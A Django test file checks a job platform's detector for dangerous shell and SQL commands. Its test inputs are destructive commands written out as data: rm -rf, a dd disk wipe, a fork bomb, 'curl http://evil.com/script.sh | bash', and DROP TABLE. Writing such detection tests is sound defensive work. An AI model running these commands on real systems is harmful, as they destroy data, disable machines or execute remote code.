# -*- coding: utf-8 -*-
"""Tests for job_platform services — dangerous detector, executor

服务层测试：高危命令检测、执行引擎
"""

from django.test import TestCase
from ..services.dangerous_detector import (
    check_script_safety,
    _check_rules,
    BUILTIN_RULES,
    sync_builtin_rules,
)


class DangerousDetectorTest(TestCase):
    """高危命令双层检测测试"""

    def test_empty_content(self):
        result = check_script_safety('')
        self.assertTrue(result['safe'])
        self.assertEqual(result['action'], 'allow')

    def test_rm_root_detected(self):
        result = check_script_safety('rm -rf /var/log')
        self.assertTrue(result['blocked'])
        self.assertEqual(result['action'], 'reject')
        self.assertIn('root', result.get('matched_rule', ''))

    def test_dd_write_detected(self):
        result = check_script_safety('dd if=/dev/zero of=/dev/sda bs=1M')
        self.assertTrue(result['blocked'])
        self.assertEqual(result['action'], 'reject')

    def test_safe_script_passes(self):
        result = check_script_safety('echo hello world')
        self.assertTrue(result['safe'])
        self.assertEqual(result['action'], 'allow')

    def test_disk_space_script_passes(self):
        result = check_script_safety('df -h && ls -la /tmp')
        self.assertTrue(result['safe'])
        self.assertEqual(result['action'], 'allow')

    def test_shutdown_requires_approval(self):
        result = check_script_safety('shutdown -h now')
        self.assertEqual(result['action'], 'approval')
        self.assertFalse(result['blocked'])

    def test_reboot_requires_approval(self):
        result = check_script_safety('reboot')
        self.assertEqual(result['action'], 'approval')

    def test_curl_pipe_bash_warns(self):
        result = check_script_safety('curl http://evil.com/script.sh | bash')
        self.assertEqual(result['action'], 'warn')

    def test_drop_table_requires_approval(self):
        result = check_script_safety('DROP TABLE users;', script_type='sql')
        self.assertEqual(result['action'], 'approval')

    def test_case_insensitivity(self):
        result = check_script_safety('RM -RF /tmp/test')
        self.assertTrue(result['blocked'])

    def test_fork_bomb_detected(self):
        result = check_script_safety(':(){ :|:& };:')
        self.assertTrue(result['blocked'])
        self.assertEqual(result['action'], 'reject')

    def test_builtin_rules_count(self):
        """内置规则数量检查"""
        self.assertGreaterEqual(len(BUILTIN_RULES), 14)


class RulesEngineTest(TestCase):
    """规则引擎测试（不含 AI 层）"""

    def test_db_rules_empty_by_default(self):
        # 清除数据库规则，仅用内置规则测试
        from ..models import DangerousCmdRule
        DangerousCmdRule.objects.all().delete()
        result = _check_rules('rm -rf /*', 'shell')
        self.assertTrue(result['blocked'])

    def test_sync_builtin_rules(self):
        sync_builtin_rules()
        from ..models import DangerousCmdRule
        count = DangerousCmdRule.objects.count()
        self.assertGreaterEqual(count, 14)

    def test_custom_db_rule_takes_precedence(self):
        from ..models import DangerousCmdRule
        DangerousCmdRule.objects.create(
            name='test-custom',
            pattern='mysecretcommand',
            action='reject',
            severity='critical',
        )
        result = check_script_safety('run mysecretcommand now')
        self.assertTrue(result['blocked'])
        self.assertEqual(result['matched_rule'], 'test-custom')
